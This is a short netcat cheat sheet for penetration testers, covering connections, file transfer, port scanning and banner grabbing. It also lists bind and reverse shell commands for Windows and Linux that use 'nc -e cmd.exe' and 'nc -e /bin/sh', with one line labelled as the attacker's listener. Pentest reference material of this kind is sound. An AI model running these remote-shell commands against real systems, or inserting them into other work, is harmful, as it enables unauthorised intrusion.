---
title: "Netcat Cheat Sheet"
description: Useful cheat sheet for netcat..pentester swiss knife!
---

# Connect to a TCP Port

```ruby
nc -nv <IP Address> <Port>
```
# Listen on a TCP Port

```perl
nc -lvp <port>
```
# Connect and receive a HTTP Page

```ruby
nc -nv <IP Address> 80
HEAD / HTTP/1.1

```
# Transferring a File
```perl
nc -lvp 4444 >output.txt          # Receiving End
nc -nv <IP Address> < input.txt   # Sending End
```
# Set up a Netcat Bind Shell (Windows)
```ruby
nc -lvp 4444 -e cmd.exe
nc -nv <IP Address> 4444          # Connect to the shell
```
# Set up a Netcat Bind Shell (Linux)
```perl
nc -lvp 4444 -e /bin/sh
nc -nv <IP Address> 4444          # Connect to the shell
```
# Set up a Netcat Reverse Shell (Windows)
```ruby
nc -lvp 443                       # Attacker listening for connection
nc -nv <IP Address> 443 -e cmd.exe
``` 
# Set up a Netcat Reverse Shell (Linux)
```perl
nc -lvp 443
nc -nv <IP Address> 443 -e /bin/sh
```

# Netcat as a Port Scanner
```ruby
nc -z <IP Address> <Port Range in abc - xyz format>
```
# Netcat as a Banner Grabber
```perl
echo "" | nc -nv -w1 <IP Address> <Ports>
```

